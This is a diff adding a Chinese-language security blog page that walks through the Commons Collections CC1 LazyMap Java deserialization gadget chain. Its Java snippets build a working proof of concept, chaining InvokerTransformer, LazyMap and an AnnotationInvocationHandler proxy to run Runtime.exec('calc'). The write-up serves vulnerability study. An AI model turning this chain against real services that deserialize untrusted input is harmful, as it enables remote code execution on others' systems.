@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"sunian19.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="上一篇我们分析的是TransformedMap的利用链，是此链条传入国内后，国内研究员的分析。 这次我们分析正版yso中的cc1 LazyMap 利用链。LazyMap相比之前的会更加麻烦一些，同时会用到动态代理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="&#39;Java反序列化-cc1-LazyMap&#39;">
+<meta property="og:url" content="https://sunian19.github.io/2022/10/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-LazyMap/index.html">
+<meta property="og:site_name" content="zer0_c|imb&#39;s blog">
+<meta property="og:description" content="上一篇我们分析的是TransformedMap的利用链，是此链条传入国内后，国内研究员的分析。 这次我们分析正版yso中的cc1 LazyMap 利用链。LazyMap相比之前的会更加麻烦一些，同时会用到动态代理。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java117.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java118.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java119.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java120.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java122.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java123.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java124.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java125.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java126.png">
+<meta property="og:image" content="https://sunian19.github.io/imgss/java127.png">
+<meta property="article:published_time" content="2022-10-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-22T15:18:01.986Z">
+<meta property="article:author" content="zer0_c|imb">
+<meta property="article:tag" content="java安全系列">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunian19.github.io/imgss/java117.png">
+
+
+<link rel="canonical" href="https://sunian19.github.io/2022/10/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-LazyMap/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://sunian19.github.io/2022/10/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-LazyMap/","path":"2022/10/18/java反序列化-cc1-LazyMap/","title":"'Java反序列化-cc1-LazyMap'"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>'Java反序列化-cc1-LazyMap' | zer0_c|imb's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?48584c486973b4bf025a425c3d7b4007"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">zer0_c|imb's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0-x-00-xun-zhao-lian-wei-de-exec-fang-fa"><span class="nav-number">1.</span> <span class="nav-text">0x00 寻找链尾的exec方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-x-01-xun-zhao-lian-zi"><span class="nav-number">2.</span> <span class="nav-text">0x01 寻找链子</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zer0_c|imb"
+      src="/imgss/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">zer0_c|imb</p>
+  <div class="site-description" itemprop="description">忘川河畔彼岸花，红如鲜血似朱砂</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">88</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:lingyu195@gmail.com" title="E-Mail → mailto:lingyu195@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3504078815" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;3504078815" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ch4ser.top/" title="http:&#x2F;&#x2F;www.ch4ser.top&#x2F;" rel="noopener" target="_blank">ch4ser</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hackergu.com/" title="http:&#x2F;&#x2F;hackergu.com&#x2F;" rel="noopener" target="_blank">Gu</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://al0neranger.github.io/" title="https:&#x2F;&#x2F;al0neranger.github.io&#x2F;" rel="noopener" target="_blank">al0neranger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/lyshark" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;lyshark" rel="noopener" target="_blank">lyshark</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunian19.github.io/2022/10/18/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1-LazyMap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/imgss/touxiang.jpg">
+      <meta itemprop="name" content="zer0_c|imb">
+      <meta itemprop="description" content="忘川河畔彼岸花，红如鲜血似朱砂">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0_c|imb's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          'Java反序列化-cc1-LazyMap'
+        </h1>
+
+
+        <div class="post-meta">
+        
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-18 00:00:00" itemprop="dateCreated datePublished" datetime="2022-10-18T00:00:00+08:00">2022-10-18</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-10-22 23:18:01" itemprop="dateModified" datetime="2022-10-22T23:18:01+08:00">2022-10-22</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">java安全系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>上一篇我们分析的是TransformedMap的利用链，是此链条传入国内后，国内研究员的分析。<br>
+这次我们分析正版yso中的cc1 LazyMap 利用链。LazyMap相比之前的会更加麻烦一些，同时会用到<strong>动态代理</strong>。<br>
+<img src="/imgss/java117.png" alt=""></p>
+<a id="more"></a>
+<h3 id="0-x-00-xun-zhao-lian-wei-de-exec-fang-fa" id="0x00-寻找链尾的exec方法">0x00 寻找链尾的exec方法</h3>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>判断map中key在不在，如果在get获取key。<br>
+如果不在(false)，利用transform方法获取key，然后put插入key value。</p>
+<p>我们去找一找 factory 是什么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure></div>
+<p>发现了熟悉的decorate方法</p>
+<p><img src="/imgss/java118.png" alt=""></p>
+<p>尝试构造攻击链</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer exec = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = LazyMap.decorate(objectObjectHashMap, exec);</span><br><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">Method LazygetMethod = lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">LazygetMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = LazygetMethod.invoke(decorateMap, runtime);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java119.png" alt=""></p>
+<p>这里不再解释，因为上一篇cc1-TransformedMap时已经构造过，这里只不过是替换为get方法，以及map class。</p>
+<p>这里InvokerTransformer也可以换成ChainedTransformer</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">Method LazygetMethod = lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">LazygetMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = LazygetMethod.invoke(decorateMap, runtime);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java120.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                , <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line">decorateMap.get(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java122.png" alt=""></p>
+<h3 id="0-x-01-xun-zhao-lian-zi" id="0x01-寻找链子">0x01 寻找链子</h3>
+<p>后面的链子基本没什么问题了，现在主要问题是找get方法。寻找执行readObject时调用get方法。<br>
+往上走，我们去找一找谁调用了 LazyMap.get()</p>
+<p>最终找到了sun\reflect\annotation\AnnotationInvocationHandler.java invoke方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        String member = method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>搜索get<br>
+最后两个get无法使用，这两个是annotationType.memberTypes，注解的成员变量，所以无法操作。<br>
+<img src="/imgss/java123.png" alt=""></p>
+<p>因此我们使用memberValues.get(member); 此get方法。<br>
+怎么调到此方法呢，前面有两个if判断，需要符合。<br>
+第一个if：调用equals方法，就会return调用equalsImpl。<br>
+第二个if：paramTypes.length不能为0，那就是我们需要传一个无参参数。</p>
+<p>然后我们发现，AnnotationInvocationHandler的readObject方法，调用了自己的invoke方法(443行注释)。如果注解成员中没有参数，那么就调用invoke方法。<br>
+<img src="/imgss/java124.png" alt=""></p>
+<p>所以我们想到了Override class。<br>
+<img src="/imgss/java125.png" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">               <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">                       , <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                       , <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span></span><br><span class="line">                       , <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">       Map decorateMap = LazyMap.decorate(objectObjectHashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">       Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       Constructor&lt;?&gt; AnnotationdeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       AnnotationdeclaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       InvocationHandler h = (InvocationHandler) AnnotationdeclaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line">       Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">       Object o = AnnotationdeclaredConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>所以我们还是使用动态代理进行构造poc。</p>
+<p><img src="/imgss/java126.png" alt=""></p>
+<p>最后的流程图<br>
+redObject()-&gt;this.memberValues.entrySet()-&gt;InvocationHandler的invoke()-&gt;this.memberValues.get()-&gt;LayzMap的get()-&gt;this.factory.transformer()后面跟transformerMap的攻击链一样。</p>
+<p><img src="/imgss/java127.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" rel="tag"># java安全系列</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/14/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%9F%BA%E7%A1%802/" rel="prev" title="'Java反序列化-基础2'">
+                  <i class="fa fa-chevron-left"></i> 'Java反序列化-基础2'
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6/" rel="next" title="'Java反序列化-cc6'">
+                  'Java反序列化-cc6' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
